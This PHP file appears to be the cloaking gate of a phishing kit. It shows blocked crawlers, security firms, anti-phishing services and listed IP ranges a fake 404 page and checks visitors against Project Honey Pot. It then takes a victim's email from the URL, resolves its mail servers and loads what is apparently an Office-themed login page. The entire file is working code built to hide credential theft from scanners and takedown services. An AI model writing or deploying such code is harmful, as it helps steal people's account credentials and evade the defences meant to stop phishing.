<?php
// Allow from any origin
if (isset($_SERVER["HTTP_ORIGIN"])) {
    // You can decide if the origin in $_SERVER['HTTP_ORIGIN'] is something you want to allow, or as we do here, just allow all
    header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
} else {
    //No HTTP_ORIGIN set, so we allow any. You can disallow if needed here
    header("Access-Control-Allow-Origin: *");
}
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Max-Age: 60");    // cache for 10 minutes

if ($_SERVER["REQUEST_METHOD"] == "OPTIONS") {
    if (isset($_SERVER["HTTP_ACCESS_CONTROL_REQUEST_METHOD"]))
        header("Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT"); //Make sure you remove those you do not want to support

    if (isset($_SERVER["HTTP_ACCESS_CONTROL_REQUEST_HEADERS"]))
        header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");

    //Just exit with 200 OK with the above headers for OPTIONS method
    exit(0);
}

$allowed_hostname = "";
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array(
    "Googlebot",
    "Baiduspider",
    "ia_archiver",
    "R6_FeedFetcher",
    "NetcraftSurveyAgent",
    "Sogou web spider",
    "bingbot",
    "Yahoo! Slurp",
    "facebookexternalhit",
    "PrintfulBot",
    "msnbot",
    "Twitterbot",
    "UnwindFetchor",
    "urlresolver",
    "Butterfly",
    "TweetmemeBot",
    "PaperLiBot",
    "MJ12bot",
    "AhrefsBot",
    "Exabot",
    "Ezooms",
    "YandexBot",
    "SearchmetricsBot",
    "picsearch",
    "TweetedTimes Bot",
    "QuerySeekerSpider",
    "ShowyouBot",
    "woriobot",
    "merlinkbot",
    "BazQuxBot",
    "Kraken",
    "SISTRIX Crawler",
    "R6_CommentReader",
    "magpie-crawler",
    "GrapeshotCrawler",
    "PercolateCrawler",
    "MaxPointCrawler",
    "R6_FeedFetcher",
    "NetSeer crawler",
    "grokkit-crawler",
    "SMXCrawler",
    "PulseCrawler",
    "Y!J-BRW",
    "80legs.com/webcrawler",
    "Mediapartners-Google",
    "Spinn3r",
    "InAGist",
    "Python-urllib",
    "NING",
    "TencentTraveler",
    "Feedfetcher-Google",
    "mon.itor.us",
    "west.us.northamericancoax.com",
    "northamericancoax.com",
    "northamericancoax",
    "mailinator",
    "mailinator.com",
    "spbot",
    "Feedly",
    "bot",
    "curl",
    "spider",
    "crawler",
    "gmail",
    "Dr.Web",
    "yandex",
    "ymail",
    "yahoo",
    "icann",
    "bot",
    "Robot",
    "above",
    "google",
    "softlayer",
    "amazonaws",
    "cyveillance",
    "phishtank",
    "dreamhost",
    "netpilot",
    "calyxinstitute",
    "tor-exit",
    "microsoft"
);
foreach ($blocked_words as $word) {

    if (substr_count($hostname, $word) > 0) {

        if (!substr_count($hostname, $allowed_hostname) > 0) {
            header("HTTP/1.0 404 Not Found");
            die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        }

    }
}

$bannedIP = array("^81.161.59.*", "^66.135.200.*", "^188.166.98.*", "^199.116.118.*", "^173.244.36.*", "^66.102.*.*", "^66.249.*.*", "^72.14.192.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^208.101.*.*", "^216.162.210.*", "^209.19.*.*", "^198.50.200.*", "^205.168.50.*", "^63.232.171.*", "^65.103.220.*", "^95.85.8.*", "^72.50.229.*", "^216.162.*.*", "^64.246.162.*", "^85.137.167.*", "^52.67.69.*", "^2.111.70.*", "^201.93.255.*", "^104.131.165.*", "^50.165.165.*", "^64.71.*.*", "^207.70.25.*", "^206.80.*.*", "^206.207.*.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "54.228.218.117", "^54.228.218.*", "185.28.20.243", "^185.28.20.*", "217.16.26.166", "^217.16.26.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^66.211.169.3", "^66.211.169.66", "^89.163.159.214", "^37.128.131.171", "^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^104.108.64.175", "104.83.233.198", "^173.194.116.102", "^173.194.112.*", "^65.55.206.154", "^193.221.113.53", "^208.76.45.53", "^208.84.*.*", "^207.46.8.167", "^65.54.188.110", "^207.46.8.199", "^134.170.2.199", "^65.55.92.152", "^65.54.188.94", "^65.55.37.104", "^65.55.92.168", "^65.55.37.120", "^65.55.33.119", "^65.55.92.184", "^65.54.188.126", "^65.55.37.88", "^65.55.37.88", "^65.55.92.136", "^207.46.8.199", "^65.55.92.168", "^65.54.188.94", "^65.55.33.119", "^65.55.37.104", "^65.54.188.110", "^65.55.37.72", "^65.55.92.152", "^207.46.8.167", "^65.55.33.135", "^134.170.2.199", "^65.55.85.12", "^173.194.116.149", "^216.58.211.37", "^89.163.159.214", "^64.233.*.*", "^66.102.*.*", "^66.249.*.*", "^216.239.*.*", "^216.33.229.163", "^64.233.173.*", "^64.68.90.*");

if (in_array($_SERVER['REMOTE_ADDR'], $bannedIP)) {
    if (!substr_count($hostname, $allowed_hostname) > 0) {
        header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
} else {
    foreach ($bannedIP as $ip) {
        if (preg_match('/' . $ip . '/', $_SERVER['REMOTE_ADDR'])) {
            if (!substr_count($hostname, $allowed_hostname) > 0) {
                header("HTTP/1.0 404 Not Found");
                die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
            }
        }
    }
}

if(isset($_SERVER['HTTP_USER_AGENT'])){
if (strpos($_SERVER['HTTP_USER_AGENT'], 'google') or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler') or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) {
    if (!substr_count($hostname, $allowed_hostname) > 0) {
        header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
}
}

if (!empty($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']) && filter_var($_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP)) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else if (filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP)) {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$timeout = 5;
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
curl_setopt($ch, CURLOPT_URL, "https://www.projecthoneypot.org/ip_$ip");
$response = curl_exec($ch);
curl_close($ch);
$test1 = strpos($response, "This IP addresses has been seen by at least one Honey Pot");
$test2 = strpos($response, "The Project Honey Pot system has detected behavior from the IP address");
$test3 = strpos($response, "This IP has not seen any suspicious activity within the last");
$test4 = strpos($response, "BingPreview");
if ($test2 == true || ($test1 == true && $test4 == true)) {
    header('HTTP/1.0 404 Not Found');
    exit;
}

$isoffice = '';
function fetchwe($domain)
{

    $mxget = $domain;
    if (dns_get_mx($domain, $mx_details)) {
        foreach ($mx_details as $key => $value) {
            $mxget .= $value;
        }
    }
    return str_replace(".", "-", $mxget);
}

define('MAGPIE_OUTPUT_ENCODING', 'UTF-8');
header('Content-Type: text/html; charset=utf-8');

$email = $_GET['e'];
$domain = substr(strrchr($email, "@"), 1);
$domtilt = explode('.', $domain);
$serv =  fetchwe($domain);
//print_r($serv); die;

////////////////
include_once 'office_page_enter_email.php';
////////////////
